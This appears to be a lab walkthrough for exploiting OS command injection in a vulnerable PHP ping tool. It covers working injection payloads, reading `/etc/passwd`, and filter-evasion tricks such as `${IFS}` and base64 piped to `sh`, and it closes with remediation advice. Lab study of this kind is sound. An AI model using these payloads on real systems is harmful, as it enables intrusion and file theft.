# Lab 02 Walkthrough: OS Command Injection (RCE)

Step-by-step offensive guide to breaking out of system command contexts, evading input filters, and reading server files.

---

## 🎯 The Mission
The target web application runs a network ping diagnostic tool.
Your objective:
1. Break out of the intended `ping` command.
2. Evade the input filter that blocks `&&` and `bash`.
3. Read the contents of `secret_flag.txt` located in the application directory.
4. Capture the flag: `FLAG{CMD_INJECTION_RCE_ROOT_PWNED}`.

---

## 🔍 Vulnerability Analysis
Look at line 30 of `index.php`:
```php
$cmd = $ping_cmd . $ip;
$output = shell_exec($cmd . " 2>&1");
```
The developer appends `$ip` directly to the command string and executes it via the operating system shell (`cmd.exe` on Windows or `/bin/sh` on Linux).

The filter on line 18 only blocks two specific substrings:
```php
if (strpos($ip, '&&') !== false) ...
elseif (stripos($ip, 'bash') !== false) ...
```

---

## 💥 Crafting the Exploit

Shell command interpreters (both Windows Command Prompt and Linux Bash) support several command chaining operators:

| Operator | Behavior | Works on Windows | Works on Linux |
| :--- | :--- | :--- | :--- |
| `;` | Sequential execution | No (PowerShell only) | Yes |
| `&` | Run first in background or sequentially | Yes (`cmd.exe`) | Yes |
| `\|` | Pipe stdout of first to stdin of second | Yes | Yes |
| `\|\|` | Run second command only if first fails | Yes | Yes |

### 1. Basic Command Chaining
Since `&&` is blocked, try `&` or `|`!

#### On Windows (`cmd.exe`):
Type into the input box:
```text
127.0.0.1 & dir
```
**What happens**: The system executes `ping -n 1 127.0.0.1`, followed immediately by `dir`. You will see the entire directory listing in the terminal output, including `secret_flag.txt`!

Now read the file:
```text
127.0.0.1 & type secret_flag.txt
```
**Output**:
```text
FLAG{CMD_INJECTION_RCE_ROOT_PWNED}
Congratulations on achieving Remote Command Execution!
```

#### On Linux (`/bin/sh`):
If running on a Linux host:
```text
127.0.0.1 ; ls -la
127.0.0.1 ; cat secret_flag.txt
```

---

## 🥷 Advanced Filter Evasion Techniques

### 1. What if Spaces are Blocked?
If a developer strips or blocks spaces (` `):
- **On Linux**: Use the Internal Field Separator environment variable `${IFS}`:
  ```bash
  127.0.0.1;cat${IFS}secret_flag.txt
  127.0.0.1;cat</etc/passwd
  ```
- **On Windows**: Use environment variables or directory slashes:
  ```cmd
  127.0.0.1&type%ProgramData:~0,1%secret_flag.txt
  ```

### 2. What if Characters like `cat` or `type` are Blocked?
- String concatenation:
  - Linux: `c'a't secret_flag.txt` or `c\at secret_flag.txt` or `$(which cat) file`
  - Windows: `t^y^p^e secret_flag.txt`
- Base64 encoding:
  - Linux: `echo "Y2F0IHNlY3JldF9mbGFnLnR4dA==" | base64 -d | sh`

---

## 🛡️ Remediation (How to Fix It)

### 1. Strict Input Validation (Allowlisting)
Validate that the input matches an exact IPv4 format using regex before executing:
```php
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address!");
}
```

### 2. Avoid Shell Execution Where Possible
Never pass raw strings to `shell_exec` or `system`. When invoking external processes, pass arguments as discrete arrays using `proc_open` without shell wrappers.
